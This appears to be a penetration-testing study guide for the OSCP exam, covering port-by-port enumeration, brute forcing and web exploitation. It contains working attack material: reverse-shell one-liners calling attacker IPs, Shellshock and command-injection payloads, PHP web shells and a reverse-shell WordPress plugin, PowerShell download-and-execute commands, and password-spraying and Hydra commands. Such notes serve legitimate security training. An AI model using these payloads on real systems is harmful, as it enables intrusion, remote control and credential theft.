---
layout: oscp_notes
title: OSCP Notes
permalink: /oscp_notes/
---

# Enumeration
## Initial Scanning
Starting commands:
1. `sudo nmap -p- -v -T4 -sC -A $IP --open` to reveal `$port1`, `$port2`, and so on
2. Then: `sudo nmap -sC -A -p$port1,$port2,etc $IP -T4`

- `sudo nmap -v -p- -sC -sV -T4 192.168.100.101` (Checks all ports)(T4/5 for additional speed)(-Pn to assume host is up)
- `sudo nmap -v -p- -sC -sV 192.168.100.101 -T4 -oN openports.txt && grep '/tcp' openports.txt | cut -d '/' -f 1 | paste -sd ','` (faster and echos open ports)
- `sudo nmap -sU 192.168.100.101` (Checks UDP ports specifically)

nmap flags:
-sS (SYN Scan)
-sU (UDP Scan)
-sT (TCP Scan)
-sV (Version enum)
-O (OS Fingerprinting)
-Pn (Assume host is up)
-p (Ports)
-A (runs all scans)
-n (No DNS)
-T 0-5 (Timing of scans, 0 is fastest, 3 is default)

### Scripting Engine
- Nmap Scripting Engine
	- The nmap scripting engine can also be used for more thorough scanning
	- Ex: `nmap --script=$script1.nse, $script2.nse $IP`
	- Find scripts: `ls /usr/share/nmap/scripts| grep $searchTerm`
	- Help on script: `nmap --script-help=$script.nse`
	- Run wildcard script: `sudo nmap --script=smb* -p 445 -Pn $IP`
	- Useful scripts from QuirkyKirkHax:
		- smb-os-discovery
		- snmp-brute * (hydra might be better)
		- smtp-brute
		- smtp-commands
		- smtp-enum-users

### nmapautomator
- Info: [nmapAutomator](https://github.com/21y4d/nmapAutomator)
- `./nmapAutomator.sh --host $Ip --type All (or Network/Port/Script/Full/UDP/Vulns/Recon)`



### autorecon
- Info: https://github.com/Tib3rius/AutoRecon

## 21 FTP
With no creds:
- `ftp anonymous@192.168.100.101`

To an alternate port:
- `ftp $user@$IP $port`


### Hydra
With a username:
 `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ftp`

- `hydra -l $user -P passwords.txt 192.168.100.101 ftp`

With a password:
- `hydra -L usernames.txt -p $password 192.168.100.101 ftp`

## 22 SSH
`ssh -i $key $user@$target`

alternate port `ssh -p $port $user@$target`

You can connect to the ssh service via netcat to grab the banner and search the version for OS info.
- `nc -nv $IP 22`

### Brute forcing:
With no creds:
- `hydra -L usernames.txt -P passwords.txt 192.168.100.101 ssh`

With a username:
- `hydra -l $user -P passwords.txt 192.168.100.101 ssh`

With a password:
- `hydra -L usernames.txt -p $password 192.168.100.101 ssh`

Useful nmap scripts:
- ssl-heartbleed.nse

SSH permissions too open?
`chmod + 600 $key.id_rsa`

## 25 SMTP
Commands:
- VRFY command tells if an email address exists.
- EXPN command shows membership of mailing list
- RCPT (you'll need a valid email for this for an exploit)

### smtp-user-enum
- To verify usernames: `smtp-user-enum -M VRFY -U users.txt -t $host` 
	- host is IP or hostname
- `smtp-user-enum -M EXPN -u $username -t $host`
- `smtp-user-enum -M RCPT -U users.txt -T $hostlist`
- `smtp-user-enum -M EXPN -D $domain -U users.txt -t $host`

### Swaks
Swaks (Sending email from command line when you have creds for mail server)
- `swaks --to <recipient@email.com> --from <sender@email.com> -ap --attach @<attachment> --server <mail server ip> --body "message" --header "Subject: Subject" --suppress-data`
	- You will need the password of the mail server user (likely the sender)
	- Note that the mail server may not be the same machine as the user who opens the email

### Send email over NC
1. `nc -v $host 25`
2. `helo pop`
3. `MAIL FROM: user@domain` (this may not need to be a real user)
4. `RCPT TO: targetUser@domaain` (does need to be real)
5. `DATA`

```
Subject: RE: password reset

Hi user, 

Click this link or your skip manager gets it - http://$kaliIP/

Regards, 

.   
```
7. `QUIT`
8. `Bye`

## 53 DNS

DNS Enumeration might give you information on other hosts in the network.
Keep in mind, you will probably have to mess with /etc/conf for this!!!

If you are looking for DNS servers specifically, use nmap to quickly and easily search:
`nmap -sU -p53 ​$network`

Normal DNS Query:
`nslookup ​$IP`

Query for MX Servers within a domain:
`dig ​$domain ​MX`

Query for Name Servers within a domain:
`dig ​$domain ​NS`

DNS Zone Transfer (This will give you all of the marbles!)
`dig axfr @​$nameServer $domain`
`dnsrecon -d ​domain ​-a --name_server ​server`

If you want to brute force subdomain enum, try dnsmap:
`dnsmap ​$domain`

## 80,443,8080, etc. Web Servers
### Directory Scanning
#### Gobuster
- `gobuster dir -u $URL -w /usr/share/wordlists/$wordlist.txt -t 5 -x .php, .txt -o gobuster.txt`
	- Where `-o` the resulting output is called results.txt
	- Where `-x` checks for those extensions
- EX: `gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5`
- EX: `gobuster dir -u http://$IP/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -k`
- Dirb is recursive - EX: `dirb http://$IP -z 10`
- **To ignore ssl/tls errors, use the `-k` flag**

#### feroxbuster 
-`feroxbuster -u $URL`
- `feroxbuster -u $URL -w $wordlist`
- `feroxbuster -u $URL -t $numberOfThreads`
- `feroxbuster -u $URL --timeout $timeoutInSeconds`
- `feroxbuster -u $URL --filter-status 404,403,400 --thorough -r`
- `feroxbuster -u $URL:$alternatePort
- `feroxbuster -u $URL -w $wordlist`

#### Nikto
- `nikto -h http://foo.com -port 8000`

#### Subdomains
**need to edit /etc/hosts with the subdomain**
With gobuster `gobuster dns -d $domain.local -t 25 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`

With wfuzz: `wfuzz -c -f sub-domains -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u 'domain.com' -H "Host: FUZZ.domain.com" --hw 93` where:
- The `-c` flag prints output with colors
- The `-f` flag outputs to a file (`sub-domains`)
- The `-w` flag is to name the wordlist
- The `-u` flag is to name the url
- THe `-H` flag is to pass the header
- The `--hw` flag is to hide results with a word count of 93. You'll need to run without this flag and then see what you are getting too much of. 

With ffuf: `ffuf -u http://$IP -H 'Host: FUZZ.domain.com' -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac`

dirsearch: `dirsearch -u http://dev.devvortex.htb/”`


### General Notes
- Check for robots.txt and sitemap.xml!
- Check for admin consoles for respective apps (MySQL, Tomcat, phpmyadmin, etc)
- Check source
	- Usernames, passwords, IPs of other machines?
	- Any fields to input data for SQLi or XSS 
	- If you find cgi-bin and are forbidden to access it, you can still brute force the cgi names to test for shellshock vuln
		- `gobuster dir -u http://$IP/ -e -s "200,204,403,500" -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt`
		- `curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://[IP]/cgi-bin/user.sh`
		- `curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/[IP]/53 0>&1' http://$IP/cgi-bin/user.sh`
- Take note of framework and OS the webserver is using.  Might help you know what tools are installed on the system.
- Useful nmap scripts:
	- `http-shellshock --script-args uri=[PATHTOCGI]`
- php://filter and php://data wrappers are gonna be big!

### Directory Traversal
On Linux, we can use the `/etc/passwd` file to test directory traversal vulnerabilities. On Windows, we can use the file `C:\Windows\System32\drivers\etc\hosts` to test directory traversal vulnerabilities, which is readable by all local users. In Linux systems, a standard vector for directory traversal is to list the users of the system by displaying the contents of /etc/passwd. Check for private keys in their home directory, and use them to access the system via SSH.
- May need to access these files, `/etc/passwd` through Burp
- Try absolute path, like `/etc/passwd` as well as with traversal sequences like `../../`
- Consider that the `../` maybe be stripped: 
  `/image?filename=....//....//....//etc/passwd` (for if application strips path traversal sequences from the user-supplied filename before using it)
- Encoding:
	  - Without:`../../../etc/passwd`
	  - URL Encoded: `%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd`
	  - Double URL encoded: `%252e%252e%252f%252e%252e%252f%252e%252e/etc/passwd`
- If the start of the path is validated for user supplied input: 
	- `image?filename=/var/www/images/../../../../etc/passwd`
- If the application requires the filename to end with an expected file extension:
	- `/image?filename=../../../etc/passwd%00.jpg`
	- **The `%00` is a null byte which effectively terminates the file path before the extension. **

### Encoding Notes
Examples:	`%20 = " "` and `%5C = "\"` and `%2e = "."` and `%2f = "/"`
- Note: Don't encode the "-" character in flags, and it looks like "/" characters also don't need to be encoded. 
- [URL Encoder](https://www.urlencoder.org/)
- EX: `curl http://$URL$.com/directory/uploads/backdoor.pHP?cmd=type%20..%5C..%5C..%5C..%5Cxampp%5Cpasswords.txt
	- where backdoor is the cmd script in the RFI section below that has already been uploaded to the Windows machine so that we can read the passwords.txt file.
	- When there is a username field, password field, and additional called MFA - From: "&&bash -c "bash -i >& /dev/tcp/192.168.45.179/7171 0>&1""
	- Becomes: `username=user1&password=pass1&ffa=testmfa"%26%26bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.179%2F7171%200%3E%261%22"`
	- So make sure to enclose command in `"&&$encondedCommand"` (incl. quotes).

#### LOG POISONING
`<?php echo system($_GET['cmd']); ?>`
Then submit `&cmd=$command` in request i.e. `&cmd=whoami`

#### Shells
- https://github.com/WhiteWinterWolf/wwwolf-php-webshell
- `bash -c "bash -i >& /dev/tcp/$IP/4444 0>&1"`
	- can URL encode
- [revshells.com](revshells.com)


### Specific Web Servers
#### Apache
This might need to be in the /etc/apache2/apache2.conf file for php to execute:

```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
    AddType application/x-httpd-php .php
```

#### IIS 
payload = .asp/.aspx shell

`C:\inetpub\wwwroot`
`iisstart.htm` = default welcome page


.htaccess for IIS servers: Similarly, developers can make directory-specific configuration on IIS servers using a web.config file. This might include directives such as the following, which in this case allows JSON files to be served to users:
```
<staticContent>
    <mimeMap fileExtension=".json" mimeType="application/json" />
    </staticContent>
```


### Wordpress
Initial enumeration: `wpscan --url http://$url --api-token $APIToken`
`/wp-admin` is the admin login page.
#### reverse shell Wordpress plugin
If you get into the admin page, you can upload malicious plugins. Plugins are defined as a zip file with 2 php files inside. (This may not be true provided the below syntax info is included in the php exploit file - so one file total with this or two files - one with this and one with the exploit). Syntax below:
```
	    <?php
	    
	    /**
	    * Plugin Name: Reverse Shell Plugin
	    * Plugin URI:
	    * Description: Reverse Shell Plugin
	    * Version: 1.0
	    * Author: Author Name
	    * Author URI: http://www.website.com
	    */
	    
	    exec("/bin/bash -c 'bash -i >& /dev/tcp/$kaliIP $port 0>&1'");
	    ?>
```

- The plugin files will be accessible from the following link:
`http://$target/wp-content/plugins/$zipName/$phpFileNmae`

### Upload Execution Tip
1. `echo "AddType application/x-httpd-php .xxx" > .htaccess`
2. upload the .htaccess file
3. then upload the .xxx file which can be executed as php

### PHP Wrappers
Note that in order to exploit these vulnerabilities, the allow_url_include setting needs to be enabled for PHP, which is not the case for default installations. That said, it is included in the material, so it makes sense to be aware of it. 
Ex: exploiting a page called admin.php
-  `curl http://$IP/$directory/index.php?page=admin.php`
-  Note that if the `<body>` tag is not closed (with a `</body>` tag at the end), the page could be vulnerable. Let's try to exploit it with the **php://filter** tag. 
	1. `curl http://$IP/$directory/index.php?page=php://filter/**convert.base64-encode**/resource=admin.php`
		1. This should return the whole page which can then be decoded for further information. 
	2. `echo "$base64Text" | base64 -d`
- Now let's try with the **data://** warpper. 
	1. `curl "http://$IP/$directory/index.php?page=**data://text/plain**,<?php%20echo%20system('ls');?>"`
		1. This shows that we can execute embeeded data via LFI. 
	2. But because some of our data like "system" may be filtered, we can encode it with base64 and try again. 
	3. `echo -n '<?php echo system($_GET["cmd"]);?>' | base64`
		- PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
	4. `"http://\<host>/\<directory>/index.php?page=**data://text/plain;base64**,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`

## 88 Kerberos / AD
**1. ADD THE DNS NAME TO YOUR `/etc/hosts` FILE**
- `dc.domain.com` AND domain.com`

To enumerate accounts ON DC:
`kerbrute userenum --dc $ip -d CONTROLLER.local Users.txt`
- --dc can point to a domain 
- probably `kerbrute_linux_arm userenum -d $domain.com --dc $IP users.txt`

To check for users on 445 with RPC:
`rpcclient -U "" -N $IP`
	- `enumdomusers`
	- `querygroup 0x200`  
	- `querygroupmem 0x200`
	- `queryuser 0x1f4` 


### Other AD Enum
`enum4linux -u "" -p "" -a <DC IP> && enum4linux -u "guest" -p ""-a <DC IP>`

`smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
`smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
`nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`

### Suggestions
- ASRepRoast if username but no password

## 111 NFS

Network File System allows you mount and access files on a remote system as if they were on your local machine. RPC binds to 111 and you can use that port to enumerate other services using rpc (rpc-info script)

You can then use the nmap scripts to gather as much info on the nfs side as possible.
`nmap -p 111 --script nfs* $IP`

Then you can mount the shared drive to your own machine and dig into it.
`sudo mount -o nolock $IP:/$shareDirectory $localMount`

If you cannot access the file: 
1. you may need to check what UUID is allowed to view the file:
- `ls -l`
2. And then create a new user on your local machine:
- `adduser`
3. Change the UUID of the newly created user:
- `sudo sed -i -e 's/[CURRENTUUID]/[NEWUUID]/g' /etc/passwd`
4. Check and make sure the command ran properly:
- `cat /etc/passwd|grep $user`
5. `su` to the new user and read away.

Useful nmap scripts:
rpc-info.se
nfs-ls.se
nfs-showmount.se
nfs-statfs.se

## 135,137,139,145,593 RPC

Enumerate users: `rpcclient -N -U "" $IP -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";`
- No pass and no user

Change users password: `setuserinfo $username 23 '$password'`
- "23" refers to level of user information being modifying, and 23 is for passwords.  It doesn't change, unless you're trying to modify something else. 

`rpcinfo $IP`

Passwordspray:
`for u in $(cat valid_users.txt);do rpcclient -U "$u%$password" -c "getusername;quit" 172.16.5.5 | grep Authority; done`

## 137,138,445 SMB

**tip - use command `recurse` before `ls` or `dir`**

- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users`
- `nxc ldap 10.10.10.10 -u '' -p '' --password-not-required --admin-count --users --groups`
- `nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 $IP -Pn` (SambaCry and EternalBlue)

To probe NetBIOS info:
`nbtscan -v ​$IP`
-The hex codes reference different services.  You can look up what they mean, but 20 means File Sharing services.
- http://www.pyeung.com/pages/microsoft/winnt/netbioscodes.html

### smbclient
To list what resources are being shared on a system:
- `smbclient -L $IP -N`
	- with no creds
- `smbclient -L $IP -U $user`
- `smbclient //$IP/$shareName -U $user%$password`
- `smbclient //$IP/$shareName -U $user --pw-nt-hash $NTLMHash`
- `smbclient //$IP/$shareName --directory path/to/directory --command "get file.txt"`
	- to download file
- `smbclient //$IP/$shareName --directory path/to/directory --command "put file.txt"`
	- to upload file

#### Format
Linux: `smbclient //server/share`
Windows: `smbclient //server/share` or `smbclient \\\\server\\share`

To display share information on a system:
- `nmblookup -A ​$IP`

Enum4linux is a great tool to gather information through SMB (note, it tests anonymous login only by default):
- `enum4linux -a ​$IP`
- try also ?: `enum4linux-ng -a ​$IP`

Brute force using hydra:
`hydra -l $User -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt smb://$IP/ -V -I`   

### smbmap
`smbmap -u $user -p $password -d INLANEFREIGHT.LOCAL -H $IP -R '$directory' --dir-only`
	- use without `--dir-only` to show all files

### to get all files from an smb share
1. `smbclient \\\\$IP\\SYSVOL -U "domain.offsec\$username"`
2. `recurse on`
3. `prompt off`
4. `mget *`
5. `exit`
6. `find . -type f`
	1. This lists all the files you have downloaded into the directory you downloaded them into

### Command Execution with NXC:
- `nxc smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='`
```
netexec smb 10.10.10.10 -u Username -p Password -X 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AY...AKAApAA=='
SMB         10.10.10.10   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:EXAMPLE.com) (signing:True) (SMBv1:False)
SMB         10.10.10.10   445    DC               [+] EXAMPLE.com\Username:Password (Pwn3d!)
SMB         10.10.10.10   445    DC               [-] WMIEXEC: Could not retrieve output file, it may have been detected by AV. If it is still failing, try the 'wmi' protocol or another exec method
```

### Password Spraying
`nxe smb $IP -u users.txt -p 'password' -d domain.com --continue-on-success`

## 161,162 SNMP 

### Notes
SNMP is that it operates using community strings which means it sends passwords when it sends data. Can be sniffed with wireshark. 
Versions:
- SNMPv1 is all cleartext, so it is easy to grab the string
- SNMPv2 has some inherent weaknesses allowing it to be grabbed 2
- SNMPv3 is encrypted, but it can be brute forced.

There are 2 kinds of community strings: Public (Read Access) and Private (Write Access).

You can also brute-force the string with nmap or Hydra:
`nmap --script=snmp-brute $targetIP
`hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt snmp://$targetIP/

But you need community string first:

### onesixtyone
- `onesixtyone -c $(file containing community strings (public, private, manager)) -i $(file containing target ips)`
- Note that there are seclists with common community strings
	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
	- /usr/share/seclists/Discovery/SNMP/snmp.txt

### snmpwalk
- `snmpwalk -c public -v1 -t 10 $targetIP`: where public is the community string (could be private or mamanger)
- `snmpwalk -c public -v1 192.168.50.151 $OIDString` - for specific info
- `snmpwalk -v $version -c public $IP NET-SNMP-EXTEND-MIB::nsExtendOutputFull`
- `snmpwalk -v 2c -c public 192.168.243.156 NET-SNMP-EXTEND-MIB::nsExtendObjects`
	- **This one seems to return the most, and everything else seemed to miss some information from OSCP Exam C**

```
|OID| Target |
|--|--|
| 1.3.6.1.2.1.25.1.6.0 | System Processes |
| 1.3.6.1.2.1.25.4.2.1.2 | Running Programs |
| 1.3.6.1.2.1.25.4.2.1.4 | Processes Path |
| 1.3.6.1.2.1.25.2.3.1.4 | Storage Units |
| 1.3.6.1.2.1.25.6.3.1.2  | Software Name |
| 1.3.6.1.4.1.77.1.2.25 | User Accounts |
| 1.3.6.1.2.1.6.13.1.3 | TCP Local Ports |
```
- `snmpwalk -Os -c public -v 1 $IP system`
	- to retrieve all
	- try 'v 2c' as well 

### Useful Nmap Scripts:
snmp-brute
snmp-win32-services.nse
snmp-win32-shares.nse
snmp-win32-software.nse
snmp-win32-users.nse

### snmpset
You can even overwrite and set some OIDs if things are misconfigured:
`snmpset -c $communityString -v $version $OID $VALUE`

### snmpenum
`snmpenum $targetIP ​$communityString $configFile
- config files are in /usr/share/snmpenum/

## 389,636 LDAP

- if you have ldap and can't find anything else:
`sudo nmap -sC -A -Pn --script "*ldap*" $IP -oN outputfile.txt'` (use output.ldap)

#### ldapdomaindump
`ldapdomaindump -u $domain.com\\ldap -p '$ldapPassword' $domain.com -o $outputDirectory`

- when you find the dc from the above script which says: "Context: DC=$name,DC=offsec":
`ldapsearch -x -H ldap://$IP -b "dc=$name,dc=offsec" > $name.ldapsearch`  (grep for cn/description/sAMAccountName)
	- This is for when the domain is `$name.offsec`
- `ldapsearch -x -H ldap://172.16.227.10 -D '$domain.com\$user' -w '$password' -b "DC=$domain,DC=com"`
- `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength`
- Another example: `ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "*" `
1. -x: This option specifies to use simple authentication instead of SASL (Simple Authentication and Security Layer). It’s often used for basic access without requiring additional security mechanisms.
2. -b "dc=support,dc=htb": This sets the base distinguished name (DN) for the search. In this case, it specifies that the search should start from the "dc=support,dc=htb" node in the directory. "dc" stands for domain component.
3. -H ldap://support.htb: This option specifies the LDAP server's URI. In this case, it's pointing to an LDAP server at support.htb.
4. -D ldap@support.htb: This is the bind DN (distinguished name) for authenticating to the LDAP server. Here, it's using the email-style format ldap@support.htb as the identity to authenticate with.
5. -W: This prompts for the password of the user specified with the -D option. It ensures that the password is not visible in the command line.
6. `"*"`: This indicates the search filter. Using `"*"` means that it will return all entries in the specified base DN.

`ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "(objectClass=user)"`

Windapsearch
- `python3 windapsearch.py --dc-ip $dcIP -u $user@domain.com -p $pass --da`
	- where `--da` means to enumerate domain admins
	- or `-PU` enumerates privileged users


First: `ldapsearch -H ldap://monitored.htb -x -s base namingcontexts`
Then: `ldapsearch -H ldap://monitored.htb -x -b "dc=monitored,dc=htb"`

## 1433 mssql

### Commands
- enum_db
- 
- `SELECT @@version;`
- `SELECT name FROM sys.databases;` (to list all available db's)
	- master, tempdb, model, and msdb are default
- `SELECT * FROM $non-default-db.information_schema.tables;`
	- `select * from $non-default-db.dbo.$table;`

See if we can impersonate a user:
- `SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'`
If we can impersonate `$user-reader`:
- `EXECUTE AS LOGIN = '$user-reader'`
- `use $user`

### xp_cmdshell
1. `EXECUTE sp_configure 'show advanced options', 1;`
2. `RECONFIGURE;`
3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
4. `RECONFIGURE;`
5. `EXECUTE xp_cmdshell 'whoami';`

### xp_dirtree
- `xp_dirtree C:\inetpub\wwwroot` for example 

### Brute forcing with ffuf
https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

### Tools
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

## 3306 mysql
- From kali: `mysql --host $IP -u root -p$password`
	- note that there is no space between -p flag and $password
	- If you get "TLS/SSL error: SSL is required", you can append `--skip-ssl`
- Or from target: `mysql -u $user -p $database` (p flag is db password, have to enter that after)

### Commands
- `select system_user();`
- `select version();`
- `show databases;`
-` SELECT * FROM $tableName WHERE $column='$field;'`


### Brute forcing with ffuf
https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345

## Brute Forcing

### Check for default credentials
- Google default credentials for the application (duh)
- `grep -r $searchTerm /usr/share/seclists`

### Hydra
- `hydra -l $username -P /usr/share/wordlists/rockyou.txt -s $alternatePort ssh://$IP`
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$password" rdp://$IP
- Web page example 1:`hydra -l $user -P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"`
- Web page example 2: `hydra -l '$username' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt $IP http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"`
	- -`"$loginpage:$parameters:$failMessage$"`
- Basic Auth: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-get`
- `hydra -L $userlist -p $pass -s 8081 $IP http-post-form '/$path:username=^USER64^&password=^PASS64^:Incorrect'`
	- where -s is for alternate ports, like 8081 and the USER and PASS are base64 encoded
- `hydra -l $user -P $passlist 'http-post-form://192.168.198.61:8081/$path$:username=^USER64^&password=^PASS64^:C=/:F=403'` 
	- Where failure is indicate by 403 error
- Notes:
	- To get Hydra to base64 each item in a list, add a 64 after the USER and PASS variables. (^USER64^ and ^PASS64^)

### Hashcat
- `hashcat -m 0 $hashfile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show`
- `hashcat -m 13400 $keepassHashFile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show`
- check hashcat for which mode to use (searching for KeePass in this case)
	- `hashcat --help | grep -i "KeePass"`
	- `hashcat -h | grep -i "ssh"`

### john the ripper
- `ssh2john id_rsa > ssh.hash` 
- `keepass2john name.kdbx > keepass1.hash`
- `john --format=krb5tgs sql_svc.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt`

### Misc
- If you're using Burp Intruder for anything, make sure to go to options to set custom error message and follow redirects
- There is http-get-form and https-post-form
- Can create a wordlist from a web page using `cewl`
	- `cewl -d -m 3 $URL -w $output.txt`
		- d = depth, m = minimum letters
	- `cewl $URL > pass`
	- `cewl --lowercase $URL`
- Generate a username list from names: https://github.com/jseidl/usernamer

## OSINT
1. DNS
	1. netcraft.com
	2. whois
2. Google dorking (filetype:pdf) etc.
3. StackOverflow
4. Shodan (for public facing)
5. Github
6. TheHarvester - automate OSINT on user emails
7. Social Searcher - deep dives on social media
8. https://osintframework.com/
9. Recon-ng

## I'm stuck
Remember: Enumerate deeply, exploit simply.

Did you do all of these?
- `sudo nmap -v -p- -sC -sV 192.168.100.101`
- `sudo nmap -sU 192.168.100.101`
- `nxc smb 192.168.101.100 -u '' -p '' --shares`
- `nxc smb 192.168.101.100 -u '' -p '' --users`
- `nxc ldap 192.168.101.100 -u '' -p '' -M get-desc-users`
- `nxc ldap 192.168.101.100 -u '' -p '' --password-not-required --admin-count --users --groups`
- `enum4linux -a $IP`

### Web Server
Did you fuzz for extensions "--extensions php,rb,txt" in feroxbuster?
Did you check for subdomains too, not just subdirectories?
Did you add your domain name to the `/etc/hosts` file?
If you see a real blog on a lab (as opposed to Lorem Ipsum), read it

### Other Tips
Use `nc` to connect directly with a port to see if you can get any output.  This can grab banners. 

Upload a file to SMB/FTP server to try and execute from the web server

Did you try to use different ports? Specifically the ports the target has open for reverse shells?

Did you try to use `domain.com/user` or just `user`?
Same with `local-auth`

Try `crackstation` or `NTLM.pw`

### Strategy
When facing a Windows server with so many ports, I’ll typically start working them prioritized by my comfort level. I’ll generate a tiered list, with some rough ideas of what I might look for on each:

- Must Look AT
    - SMB - Look for any open shares and see what I might find there.
    - LDAP - Can I get any information without credentials?
- If those fail
    - Kerberos - Can I brute force usernames? If I find any, are they AS-REP-Roast-able?
    - DNS - Can I do a zone transfer? Brute force any subdomains?
    - RPC - Is anonymous access possible?
- Note for creds
    - WinRM - If I can find creds for a user in the Remote Management Users group, I can get a shell
 
# Exploit
## Beloved Shells
### revshells.com
Try https://revshells.com to generate shells using a given port and IP
- take note to change the shell from `cmd` to `/bin/bash` or whatever as needed

### Solid RCE shell for Windows 1
- https://github.com/antonioCoco/ConPtyShell/blob/master/README.md
`powershell IEX(IWR http://192.168.45.230/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.230 443`
- need to be serving InvokeConPtyShell.ps1 from 80

### Solid RCE shell for Windows 2
`IEX(New-Object System.Net.WebClient).DownloadString('http://${ATTACKER_IP}:${ATTACKER_HTTP_PORT}/powercat.ps1'); powercat -c ${ATTACKER_IP} -p ${ATTACKER_PORT} -e powershell`
- need to be serving powercat.ps1 from 80

### Linux
`busybox nc 192.168.xxx.xxx 1234 -e sh`

### Python
Nested quotes:
- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.118.11",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`


## Buffer Overflow
As these are my OSCP notes, and there is no longer a buffer overflow machine on the exam, I'm leaving this content out of the guide for brevity. Instead I'll link a resource which turned out to be better and more succinct than the notes I took on the subject when I went through the course. Here is [V1n1v131r4's guide on Buffer Overflows](https://github.com/V1n1v131r4/OSCP-Buffer-Overflow). 

## Generating Shellcode
For the fields that say "place your shellcode here," such code can be generated using msfvenom like this:
- `msfvenom -p windows/shell_reverse_tcp LHOST=$kaliIP LPORT=443 -f powershell -v sc`
- `msfvenom -p $payload LHOST=$targetIP LPORT=$port EXITFUNC=THREAD -f $format -a $arch --platform $platform -e $encoder > $filename`


Check for Directory Traversals, LFI and RFI on php pages.
Consider inserting php code into log files and then running LFI exploits to run code.

SAMPLE LFI PHP WRAPPER PAYLOAD:
http://[IP]/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

## LFI
- Executing a file on the server, though we may have to modify it first somehow.  
- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
	3. Then change the request to include "cmd=ls" to test
	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
	5. Then one liner shell:
		- `bash -c "bash -i >& /dev/tcp/$kaliIP/$kaliPort 0>&1"`
		- URL encoded though
	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
	- On a Linux target Apache’s access.log file can be found in the /var/log/apache2/ directory.
- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 

## RFI
- Executing on our file on the server. 
- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
 [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):
	```
	<?php
	
	if(isset($_REQUEST['cmd'])){
	        echo "<pre>";
	        $cmd = ($_REQUEST['cmd']);
	        system($cmd);
	        echo "</pre>";
	        die;
	}
	
	?>
	```
- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"

##  Public Exploits
SearchSploit/Exploit-DB
`searchsploit $searchterm`
`searchsploit -x $file 
`searchsploit -m $file` (copies to working directory)
- Exploits for searchsploit are found in `/usr/share/exploitdb/exploits/`

TIPS:
- `SEC_UNKNOWN_ISSUER` error can be bypassed with the `verify=False` param in Python


## SQLi
